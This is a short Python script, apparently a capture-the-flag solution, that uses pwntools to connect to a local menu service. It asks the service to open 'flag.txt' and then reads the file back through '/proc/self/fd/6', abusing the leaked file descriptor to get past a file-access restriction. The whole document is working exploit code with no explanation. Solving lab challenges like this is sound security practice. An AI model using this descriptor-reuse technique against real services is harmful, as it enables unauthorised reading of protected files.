import pwn

HOST = 'localhost'
PORT = 4746

conn = pwn.remote(HOST, PORT)

print(conn.recvuntil(b'Enter choice:').decode())
conn.sendline(b'2')
print(conn.recvuntil(b'Enter file name:').decode())
conn.sendline(b'flag.txt')
print(conn.recvuntil(b'Enter choice:').decode())
conn.sendline(b'2')
print(conn.recvuntil(b'Enter file name:').decode())
conn.sendline(b'/proc/self/fd/6')
print(conn.recvuntil(b'Enter choice:').decode())
conn.sendline(b'3')
print(conn.recvall().decode())

conn.close()
